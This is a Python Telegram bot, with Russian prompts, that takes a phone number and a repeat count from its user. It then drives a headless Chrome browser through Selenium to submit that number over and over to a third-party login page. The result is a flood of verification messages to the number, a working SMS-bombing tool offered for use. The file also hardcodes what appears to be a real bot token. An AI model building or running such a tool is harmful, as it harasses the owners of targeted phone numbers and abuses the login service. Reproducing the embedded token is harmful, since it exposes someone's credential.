import asyncio
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time

TOKEN = "8676884588:AAFy8GLWAfTExVAqHLbbf_qIOPPxgNkQOfE"
class SpamState(StatesGroup):
    waiting_phone = State()
    waiting_count = State()

bot = Bot(token=TOKEN)
dp = Dispatcher()

@dp.message(Command("start"))
async def start_cmd(message: Message):
    await message.answer("Отправь /spam")

@dp.message(Command("spam"))
async def spam_cmd(message: Message, state: FSMContext):
    await state.set_state(SpamState.waiting_phone)
    await message.answer("Введи номер (+77771234567)")

@dp.message(SpamState.waiting_phone)
async def phone_received(message: Message, state: FSMContext):
    phone = message.text.strip()
    if not phone.startswith('+') or len(phone) < 10:
        await message.answer("Некорректный номер")
        return
    await state.update_data(phone=phone)
    await state.set_state(SpamState.waiting_count)
    await message.answer("Количество запросов (число)")

@dp.message(SpamState.waiting_count)
async def count_received(message: Message, state: FSMContext):
    try:
        count = int(message.text.strip())
        if count <= 0:
            await message.answer("Положительное число")
            return
    except ValueError:
        await message.answer("Введи число")
        return
    data = await state.get_data()
    phone = data.get("phone")
    await state.clear()
    await message.answer(f"Начинаю спам на {phone} - {count} раз")
    asyncio.create_task(spam_worker(message, phone, count))

async def spam_worker(message: Message, phone: str, count: int):
    options = webdriver.ChromeOptions()
    options.add_argument("--headless")
    driver = webdriver.Chrome(options=options)
    for i in range(count):
        try:
            driver.get("https://cabinet.presscode.app/auth/login")
            wait = WebDriverWait(driver, 10)
            phone_input = wait.until(EC.presence_of_element_located((By.NAME, "phone")))
            phone_input.clear()
            phone_input.send_keys(phone)
            submit = driver.find_element(By.XPATH, "//button[@type='submit']")
            submit.click()
            await message.answer(f"[{i+1}/{count}] Отправлено")
        except Exception as e:
            await message.answer(f"[{i+1}/{count}] Ошибка: {str(e)[:60]}")
        time.sleep(8)
    driver.quit()
    await message.answer("Готово")

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    dp.run_polling(bot)
